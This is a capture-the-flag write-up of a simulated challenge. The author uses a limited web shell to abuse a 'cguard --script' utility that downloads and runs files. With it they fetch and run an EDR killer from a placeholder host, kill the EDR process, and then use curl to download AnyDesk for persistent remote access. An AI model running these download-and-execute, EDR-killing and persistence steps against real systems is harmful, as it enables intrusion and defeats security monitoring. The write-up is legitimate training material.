\# O7: Bypass the EDR

\#\# Problem Description  
You cashed in your creds and now have initial access to a host in The Lucky Lion's internal network \- one step closer to payday\!\! You better make sure you've got more than one way into this environment in case someone kicks you out \- perhaps it would be prudent to download and install some remote management software for future use.

That might be easier said than done, though... you expect The Lucky Lion's security tools might give you trouble. Fortunately, another member of The Mound has written an EDR killer ("f4c3st4b") specific to the EDR you identified earlier. The only issue might be getting it on the host.

\#\# Objectives  
\- Download AnyDesk on the victim machine

Required tools:  
\- Web Shell: \`https://target-httpd.chals.io/shell/edr.html\`  
\- AnyDesk SIMULATED LINK: \`https://anydesk.com.example/downloads/anydesk.bin\`  
\- "f4c3st4b" EDR Killer SIMULATED LINK: \`https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab\`

\*\*Note: The simulated links are not real and do not go anywhere.

\#\# Approach and Solution

What a challenge\! I struggled a lot with this one, primarily because many of the usual bash commands I rely on either didn’t exist or didn’t work as expected. In this case, my own familiarity with common tools became a major obstacle.

Let’s start with the web shell. It’s completely simulated in the browser using JavaScript, allowing the CTF to handle hundreds of participants working on this problem simultaneously. However, it’s *extremely* limited in functionality. A good tip: in any new Unix-like environment, always run the `help` command to see what’s available. Here’s what we get:

Yes, that’s every command available in this shell. All of them. Yep.

The most glaring issue is that there’s no command for creating files. We have `mkdir`, but no `touch` or anything similar. Attempts to use `cat > example.txt` or `echo "sample text" > example.txt` also failed:

Since file creation is off the table, I turned to exploring the system for alternatives. After some searching, I found a few interesting things:

* `narsh`, located in `/bin`, which is the shell we’re in.  
* `cguard`, located in `/usr/bin`  
* `cguardd` (yes, there are two), also in `/usr/bin`  
* `cguard.sentinel`, located in `/var/lib`

Running `--help` on each of these turned up something interesting for `cguard`:

It can be used as a command\! Even better, there’s a `--script` option that allows us to download and run scripts.

So, I used this command to download `facestab`:

`cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab`

This downloaded the `facestab` file into the `/tmp` directory.

After navigating to `/tmp` and running `./facestab -h`, I got this output:

The usage of `facestab` revolves around PIDs. Luckily, we have access to the `ps` command, as noted earlier. Running `ps --help` shows a `-A` option that lists all processes. Running `ps -A` gives us this:

From prior knowledge, we know `narsh` is the shell, so its PID isn’t the one we need. The target is likely PID 10\.

However, when I tried `./facestab -p 10` in `/tmp`, I got an “invalid permissions” error. Our permissions weren’t high enough\!

This was the point where I got stuck for quite a while. Here’s a list of failed attempts:

1. Tried using `chmod` to change permissions (no luck).  
2. Tried forcing `cat` to create a file.  
3. Tried forcing `echo` to create a file.  
4. Attempted to write a script outside the environment and download it using curl (curl is blocked until we disable the EDR).  
5. Attempted to download and run a script via `cguard` (received a “try again” error).  
6. Tried creating a directory with 777 permissions and placing files there (no luck due to the lack of file creation options).

Reading the source code (which was a unique experience on a phone), I realized that the key was hinted at in the `cguard` description all along: it downloads AND runs scripts. The missing step was to re-download the script and attach the PID argument. After refreshing for a clean environment, I ran this:

`cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab -p 10`

This returned “successfully killed 10.” Checking the system showed that `cguard.sentinel` was gone—we had successfully disabled the EDR.

The final step was to download AnyDesk. We needed to do this in a directory with full read/write/execute permissions. Running `ls -l` revealed that `/tmp` has 777 permissions:

So, I navigated to `/tmp` and ran curl:

`curl https://anydesk.com.example/downloads/anydesk.bin`

After downloading, we obtained the flag:
